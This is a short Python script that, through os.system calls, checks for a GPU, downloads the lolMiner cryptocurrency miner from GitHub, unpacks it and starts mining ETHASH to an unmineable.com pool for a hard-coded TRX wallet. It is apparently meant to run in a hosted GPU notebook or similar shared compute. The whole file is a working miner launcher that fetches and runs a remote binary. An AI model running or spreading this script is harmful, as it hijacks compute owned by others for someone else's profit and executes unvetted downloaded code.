import os as alpha
alpha.system("pip install --upgrade pip")
alpha.system("nvidia-smi")
alpha.system("nvidia-smi")
alpha.system("apt-get install wget")
alpha.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz")
alpha.system("tar xf lolMiner_v1.31_Lin64.tar.gz")
alpha.system("1.31/./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TR78yAk3hWRt7v2Sa5raUi8GLoc3RdSrd9.x --ethstratum ETHPROXY")
